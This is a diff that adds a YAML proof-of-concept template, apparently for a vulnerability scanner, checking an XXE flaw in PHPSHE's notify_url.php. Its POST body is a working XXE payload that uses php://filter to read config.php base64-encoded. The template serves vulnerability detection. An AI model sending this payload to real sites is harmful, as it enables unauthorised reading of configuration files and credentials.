@@ -1,0 +1,17 @@
+id: poc-yaml-phpshe-notify-urlphp-xxe
+info:
+  name: PHPSHE notify_url.php 存在XXE漏洞
+  severity: high
+  tags:
+  - xxe
+  finger: PHPSHE
+  osprey-id: vb_2018_0006
+requests:
+- method: POST
+  path: /include/plugin/payway/wechat/notify_url.php
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: <!DOCTYPE updateProfile [ <!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=../../../../config.php">%file;]>
+  expression: contains(body, "PD9waHA") && contains(body, "simplexml_load_string")
+variables: {}
+transport: http
